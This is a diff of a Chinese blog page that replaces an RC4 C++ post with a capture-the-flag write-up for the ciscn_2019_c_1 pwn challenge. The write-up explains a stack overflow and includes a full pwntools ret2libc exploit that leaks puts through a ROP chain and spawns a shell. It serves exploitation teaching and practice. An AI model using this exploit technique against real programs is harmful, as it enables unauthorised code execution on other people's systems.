@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>RC4-C++ cover | 2st&#39;s Blog</title>
-  <meta name="keywords" content=" 密码学 ">
-  <meta name="description" content="RC4-C++ cover | 2st&#39;s Blog">
+  <title>cisc_2019_n_1 | 2st&#39;s Blog</title>
+  <meta name="keywords" content=" ROP ">
+  <meta name="description" content="cisc_2019_n_1 | 2st&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="用C++写的RC4实现并封装了一个类，如果想同一个实例实现加解密，记得调用RC4::clear 123456789101112131415161718&#x2F;&#x2F;rc4.h#include &amp;lt;iostream&amp;gt;#include &amp;lt;cstdio&amp;gt;#include &amp;lt;cstdlib&amp;gt;#include &amp;lt;cstring&amp;gt;class RC4&amp;#123;    pub">
 <meta name="keywords" content="密码学">
@@ -409,9 +409,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-RC4-C++ cover" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-ciscn_2019_1" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">RC4-C++ cover</h1>
+        <h1 class="article-title">cisc_2019_n_1</h1>
     
     <div class="article-meta">
         
@@ -419,26 +419,26 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="算法">算法</a>
+                <a href="javascript:" data-rel="Pwn">Pwn</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color4">密码学</a>
+            <a href="javascript:" class="color4">ROP</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-02-04 15:22:33'>2020-02-04 15:22</time>
+        创建时间:<time class="date" title='更新时间: 2020-02-05 15:59:16'>2020-02-05 15:59</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:304</span>
+        <span>字数:343</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -473,10 +473,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>用C++写的RC4实现并封装了一个类，如果想同一个实例实现加解密，记得调用RC4::clear</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//rc4.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        RC4();  </span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">int</span> sbox[<span class="number">256</span>]; <span class="comment">// 对称加密中的置换盒 S盒</span></span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//rc4.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"rc4.h"</span></span></span><br><span class="line">RC4::RC4()</span><br><span class="line">&#123;</span><br><span class="line">    x = <span class="number">0</span>;</span><br><span class="line">    y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化算法</span></span><br><span class="line"><span class="keyword">void</span> RC4::rc4_init(<span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span> ; i++) &#123;</span><br><span class="line">        sbox[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = ( j + sbox[i] + key[i % Len] ) % <span class="number">256</span>;</span><br><span class="line">        </span><br><span class="line">        tmp = sbox[i];</span><br><span class="line">        sbox[i] = sbox[j];</span><br><span class="line">        sbox[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">void</span> RC4::encrypt(<span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span> ; k &lt; Len ; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        y = (y + sbox[x] ) % <span class="number">256</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">std</span>::swap(sbox[x],sbox[y]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> r = ( sbox[x] + sbox[y] ) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= sbox[r];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> RC4::<span class="built_in">clear</span>()</span><br><span class="line">&#123;</span><br><span class="line">    x = y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*unsigned char data[18] ="This is plaintext",key[4] = "Key";</span></span><br><span class="line"><span class="comment">    RC4 demo;</span></span><br><span class="line"><span class="comment">    demo.rc4_init(key,3);</span></span><br><span class="line"><span class="comment">    demo.do_crypt(data,17);</span></span><br><span class="line"><span class="comment">    printf("%x\n", data);*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> data[<span class="number">17</span>] = &#123;<span class="number">191</span>, <span class="number">247</span>, <span class="number">30</span>, <span class="number">242</span>, <span class="number">151</span>, <span class="number">93</span>, <span class="number">185</span>, <span class="number">82</span>, <span class="number">215</span>, <span class="number">117</span>, <span class="number">43</span>, <span class="number">65</span>, <span class="number">9</span>, <span class="number">194</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">121</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">3</span>] = &#123;<span class="number">0x4b</span>, <span class="number">0x65</span>, <span class="number">0x79</span>&#125;;</span><br><span class="line">    RC4 dem0;</span><br><span class="line">    dem0.rc4_init(key, <span class="number">3</span>);</span><br><span class="line">    dem0.encrypt(data, <span class="number">17</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <p>入门Pwn的一道题，利用了构造ROP链和泄露libc地址getshell，对于新手来说比较全面，简单记录一下</p>
+<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_153500.png" alt=""></p>
+<p>先检查程序开的保护，开了NX，不能往buf里填shellcode了，没有canary，放心溢出</p>
+<p>看一下程序的流程</p>
+<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_153944.png" alt=""></p>
+<p>简单分析一下，溢出点只能在encrypt里</p>
+<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_154206.png" alt=""></p>
+<p>s和rbp的距离为0x50，那么只需要在覆盖之后利用调用过的puts函数，将puts的真实地址泄露出来，再利用libc.so或者LibcSearcher莽出system和/bin/sh的地址就可以getshell了。泄露之后要让程序再执行一遍gets，这里我选择让他返回encrypt函数。</p>
+<p>由于是64位的程序，所以要把GOT表中puts的地址放入rdi中，所以需要一个pop rdi的gadget</p>
+<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_155647.png" alt=""></p>
+<p>至此，可以写出exp了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//ciscn_2019_1_exp.py</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ciscn_2019_c_1&apos;)</span><br><span class="line">ciscn=ELF(&apos;./ciscn_2019_c_1&apos;)</span><br><span class="line"></span><br><span class="line">puts_plt=ciscn.plt[&apos;puts&apos;]</span><br><span class="line">puts_got=ciscn.got[&apos;puts&apos;]</span><br><span class="line">encrypt = ciscn.symbols[&apos;encrypt&apos;]</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line"></span><br><span class="line">payload =&apos;A&apos; * 0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sh.recvuntil(&apos;Input your choice!\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Input your Plaintext to be encrypted\n&apos;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;@\n&apos;)</span><br><span class="line">puts_addr=u64(sh.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;, puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(&apos;puts&apos;)</span><br><span class="line"></span><br><span class="line">system_addr=libcbase+libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr=libcbase+0x18cd57</span><br><span class="line"></span><br><span class="line">payload =&apos;A&apos;*0x58+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Input your Plaintext to be encrypted\n&apos;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
       
@@ -487,12 +495,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>RC4-C++ cover</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">304</span></p>
+    <p><span class="copy-title">文章标题:</span>cisc_2019_n_1</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">343</span></p>
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="2st">2st</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-02-04, 15:22:33</p>
-    <p><span class="copy-title">最后更新:</span>2020-02-04, 15:22:33</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/02/04/RC4-C++%20cover/" title="RC4-C++ cover">https://m-ouse.github.io/2020/02/04/RC4-C++%20cover/</a>
+    <p><span class="copy-title">发布时间:</span>2020-02-05, 15:59:16</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-05, 15:59:16</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/02/05/ciscn_2019_1/" title="cisc_2019_n_1">https://m-ouse.github.io/2020/02/05/ciscn_2019_1/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
